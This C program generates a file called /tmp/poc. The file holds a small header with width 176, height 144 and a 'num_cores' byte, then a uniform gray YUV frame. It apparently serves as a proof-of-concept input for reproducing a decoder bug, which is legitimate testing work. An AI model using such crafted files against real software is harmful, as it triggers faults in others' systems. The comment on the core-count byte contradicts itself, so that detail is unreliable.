#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    // Write 4-byte little-endian width = 176
    fputc(0xB0, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    // Write 4-byte little-endian height = 144
    fputc(0x90, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    
    // Byte 8: num_cores = 2 (set to 0x01 to get 2 cores)
    fputc(0x01, f);
    
    // Remaining header bytes (total 44-byte header as per spec)
    for (int i = 9; i < 44; i++) {
        fputc(0x00, f);
    }

    // Write Y data (176*144 = 25344 bytes)
    for (int i = 0; i < 25344; i++) {
        fputc(0x80, f);  // mid-gray luma
    }
    // Write U data (88*72 = 6336 bytes)
    for (int i = 0; i < 6336; i++) {
        fputc(0x80, f);  // neutral chroma
    }
    // Write V data (88*72 = 6336 bytes)
    for (int i = 0; i < 6336; i++) {
        fputc(0x80, f);  // neutral chroma
    }

    fclose(f);
    return 0;
}